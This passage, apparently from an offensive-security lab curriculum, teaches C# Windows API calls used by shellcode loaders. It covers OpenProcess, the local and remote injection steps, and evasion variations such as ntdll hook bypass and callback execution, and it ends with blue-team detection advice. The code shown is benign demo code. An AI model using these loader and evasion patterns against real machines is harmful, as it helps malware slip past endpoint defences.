            Console.WriteLine("[-] Could not find VirtualAlloc.");
            return;
        }
        Console.WriteLine("[+] VirtualAlloc at: 0x" + vaAddr.ToString("X"));

        var allocFunc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(
            vaAddr, typeof(VirtualAllocDelegate));
        Console.WriteLine("[+] Created callable function from address.");

        IntPtr mem = allocFunc(IntPtr.Zero, 4096, 0x3000, 0x04);
        if (mem == IntPtr.Zero)
        {
            Console.WriteLine("[-] Dynamic VirtualAlloc call failed.");
            return;
        }
        Console.WriteLine("[+] Allocated memory at: 0x" + mem.ToString("X"));

        VirtualFree(mem, 0, 0x8000);
        Console.WriteLine("[+] Memory freed. Done.");
    }
}
```

### Part 10: OpenProcess - Accessing Another Running Program

Documents 09 and 10 inject code into other running programs instead of running it in the loader's own process. To do this, you first need to get a handle to the target process.

On your Windows VM right now, programs like explorer.exe (the desktop and file manager), svchost.exe (Windows services), and others are running. Each one has its own process ID and its own private memory space. OpenProcess asks Windows for a handle to one of these running processes:

```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
```

`dwDesiredAccess` specifies what you want to do with the process:
- `0x0400` is PROCESS_QUERY_INFORMATION. It lets you read information about the process (its name, memory usage, etc.) but you cannot modify anything. This is safe.
- `0x001FFFFF` is PROCESS_ALL_ACCESS. It gives you full control over the process, including writing to its memory and creating threads in it. This is what the injection loaders use.

`bInheritHandle` is almost always `false`.

`dwProcessId` is the PID of the process you want to open.

C# has a built-in way to find processes by name:

```csharp
using System.Diagnostics;
```

```csharp
        Process[] found = Process.GetProcessesByName("explorer");
```

This searches all running processes for ones named "explorer" (you leave off the .exe part). It returns an array because there could be multiple instances.

```csharp
        if (found.Length == 0)
        {
            Console.WriteLine("[-] explorer.exe is not running.");
            return;
        }

        int targetPid = found[0].Id;
        Console.WriteLine("[+] Found explorer.exe with PID: " + targetPid);
```

`found[0].Id` gets the PID of the first explorer.exe found.

```csharp
        IntPtr handle = OpenProcess(0x0400, false, targetPid);
        if (handle == IntPtr.Zero)
        {
            Console.WriteLine("[-] OpenProcess failed.");
            return;
        }
        Console.WriteLine("[+] Got handle to explorer.exe.");

        CloseHandle(handle);
        Console.WriteLine("[+] Handle closed.");
```

This opens explorer.exe with read-only permissions. It does not modify anything. It just proves you can get a handle to another process.

For injection (Documents 09 and 10), after getting a handle with PROCESS_ALL_ACCESS, you use three more functions:

**VirtualAllocEx** allocates memory inside the target process. It is like VirtualAlloc but the memory goes into the other process, not yours.

**WriteProcessMemory** copies bytes from your process into the target process. It is like Marshal.Copy but across process boundaries.

**CreateRemoteThread** creates a thread in the target process. It is like CreateThread but the thread runs inside the other process.

The full injection pattern is:

1. Find the target process by name
2. OpenProcess to get a handle with full access
3. VirtualAllocEx to allocate memory in the target process
4. WriteProcessMemory to copy shellcode into that memory
5. CreateRemoteThread to start executing the shellcode inside the target process

We do not call VirtualAllocEx, WriteProcessMemory, or CreateRemoteThread in this document because they need real shellcode and a properly set up attack scenario. You will use them in Document 09.

Here is the safe OpenProcess example:

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    static void Main(string[] args)
    {
        string target = args.Length > 0 ? args[0] : "explorer";

        Process[] found = Process.GetProcessesByName(target);
        if (found.Length == 0)
        {
            Console.WriteLine("[-] " + target + " is not running.");
            return;
        }

        int pid = found[0].Id;
        Console.WriteLine("[+] Found " + target + ".exe with PID: " + pid);

        IntPtr handle = OpenProcess(0x0400, false, pid);
        if (handle == IntPtr.Zero)
        {
            Console.WriteLine("[-] OpenProcess failed.");
            return;
        }

        Console.WriteLine("[+] Got handle to " + target + ".exe: 0x" + handle.ToString("X"));

        CloseHandle(handle);
        Console.WriteLine("[+] Handle closed.");
    }
}
```

Run with `dotnet run` to target explorer, or `dotnet run -- notepad` to target notepad (if it is running).

### Part 11: The Complete Loader Pattern

Every loader in Documents 05 through 10 follows the same sequence of steps. Now that you understand each function, here is the full pattern:

```
Step 1: Read encrypted shellcode from a file on disk (File.ReadAllBytes from Document 02)
Step 2: Get the decryption key from the command line (args from Document 02)
Step 3: Decrypt the shellcode using XOR (TransformData from Document 02)
Step 4: Allocate read-write memory (VirtualAlloc with 0x04)
Step 5: Copy decrypted shellcode into that memory (Marshal.Copy)
Step 6: Clear the shellcode from the C# array (Array.Clear)
Step 7: Change memory to executable (VirtualProtect with 0x20)
Step 8: Create a thread at the shellcode address (CreateThread)
Step 9: Wait for the thread to finish (WaitForSingleObject)
```

For remote injection (injecting into another process), steps 4 through 8 change:

```
Step 4: Open the target process (OpenProcess)
Step 5: Allocate memory inside the target process (VirtualAllocEx)
Step 6: Copy shellcode into the target process (WriteProcessMemory)
Step 7: Change permissions in the target process (VirtualProtectEx)
Step 8: Create a thread in the target process (CreateRemoteThread)
```

The idea is the same either way: get shellcode bytes into executable memory and tell the CPU to run them. The only difference is whether the memory is in your own process or in another process.

Document 05 builds the first real working loader using this pattern.

## Compilation and Execution

For every example:

1. Open `cd C:\Users\kimjongun\Desktop\CSharpLab\Lesson`
2. Replace Program.cs with the example code
3. Run: `dotnet run`
4. For programs with arguments: `dotnet run -- notepad`

The MessageBox example needs the desktop (it does not work from SSH). All other examples work from any terminal.

## Confirming Success

After this document, verify:

- [ ] You understand that programs ask Windows to do things by calling Windows API functions
- [ ] You know that DLL files contain collections of Windows functions (kernel32.dll, user32.dll, ntdll.dll)
- [ ] You can declare a Windows function with [DllImport] and call it from C#
- [ ] You called MessageBox and saw a dialog box appear on screen
- [ ] You called GetCurrentProcessId and verified the PID in Task Manager
- [ ] You understand that handles are reference numbers Windows uses to track resources
- [ ] You can call VirtualAlloc to get a block of memory with specific permissions
- [ ] You can use Marshal.Copy to put bytes into allocated memory
- [ ] You can use VirtualProtect to change memory permissions to executable
- [ ] You can use CreateThread to start running code at a memory address
- [ ] You can use WaitForSingleObject to keep the program alive while the thread runs
- [ ] You understand that DllImport puts function names in the import table, and Defender reads the import table
- [ ] You can use GetModuleHandle and GetProcAddress to find functions at runtime without DllImport
- [ ] You can find a running process by name and open it with OpenProcess

## What Was Gained

You now know how to call Windows functions from C#. Every C# program that interacts with the Windows operating system uses the pattern you learned here: declare the function with DllImport (or find it at runtime with GetProcAddress), describe its parameters, and call it.

The specific functions you learned are the building blocks of every loader:

- **VirtualAlloc** gets memory from Windows with the permissions you choose
- **Marshal.Copy** puts your shellcode bytes into that memory
- **VirtualProtect** changes the memory permissions so the CPU can execute the bytes
- **CreateThread** starts a new thread that runs the bytes as code
- **WaitForSingleObject** keeps the program alive while the shellcode runs
- **GetModuleHandle + GetProcAddress** find functions at runtime so their names do not appear in the import table
- **OpenProcess** gives you access to another running process for injection

The differences between the 8 loaders are which evasion techniques they add on top of this base pattern: XOR encryption (Document 06), direct syscalls that bypass Defender's hooks (Document 07), patching AMSI (Document 08), reflective DLL injection (Document 09), and everything combined (Document 10).

## Common Threats and Variations

### Variation 1: Using ntdll.dll Instead of kernel32.dll

Instead of calling VirtualAlloc from kernel32.dll, you can call NtAllocateVirtualMemory from ntdll.dll. This skips kernel32.dll entirely. Since Defender places its hooks inside kernel32.dll functions, calling ntdll.dll directly bypasses those hooks. Document 07 covers this in full.

### Variation 2: Callback Functions Instead of CreateThread

CreateThread is a function Defender watches closely. Some loaders avoid calling CreateThread by using Windows functions that accept a callback. A callback is a function address that Windows calls for you. For example, the function `EnumChildWindows` accepts a function address and calls it for every window on screen. If you pass your shellcode's address as the callback, Windows calls your shellcode without you ever calling CreateThread. Defender has a harder time detecting this because EnumChildWindows is used by many legitimate programs.

### Variation 3: Replacing WriteProcessMemory

WriteProcessMemory is heavily monitored. Some loaders use NtWriteVirtualMemory from ntdll.dll instead, or they map a shared memory section between two processes and write to it through the shared mapping. Both approaches achieve the same result (getting bytes into another process) without calling the monitored function.

## Detection and Defense (Blue Team Perspective)

**Import table analysis.** When a .NET binary is compiled with DllImport declarations, those function names appear in the binary's import table. YARA rules can match binaries that import suspicious combinations like VirtualAlloc + CreateThread + WriteProcessMemory. Florian Roth's YARA rule repository contains rules for known offensive .NET tools.

Blue team action: scan all new .NET executables for suspicious import combinations. Alert on binaries that import injection-related APIs.

**API hook monitoring.** EDR products hook functions like VirtualAlloc and CreateThread inside kernel32.dll. Every call is logged with its parameters: how much memory was requested, what permissions were set, which address the new thread starts at. When a program allocates executable memory and starts a thread at that address, the EDR generates an alert.

Blue team action: configure EDR to alert when VirtualAlloc is called with executable permissions (0x20, 0x40) followed by CreateThread with a start address in that allocation.

**Memory permission change detection.** Legitimate programs rarely call VirtualProtect to add execute permission to a memory region. A program that allocates memory as read-write, writes data into it, then changes it to executable is following the shellcode injection pattern.

Blue team action: monitor VirtualProtect calls that add execute permission. Alert when a process changes memory from writable to executable.

**Dynamic resolution detection.** Programs that call GetProcAddress to find VirtualAlloc or CreateThread are using a technique common in malware. Legitimate programs typically import these functions directly with their compiler's import mechanism.

Blue team action: log GetProcAddress calls and flag when the resolved function name is VirtualAlloc, CreateThread, WriteProcessMemory, or other injection-related functions.

## What Comes Next

Document 04 (lab/materials/04_memory_fundamentals.md) goes deeper into how Windows manages memory. You will learn what virtual memory is, what pages and permissions are, how each process gets its own address space, and the difference between local memory operations and remote memory operations. This gives you the foundation for understanding exactly what happens when VirtualAlloc and WriteProcessMemory run.
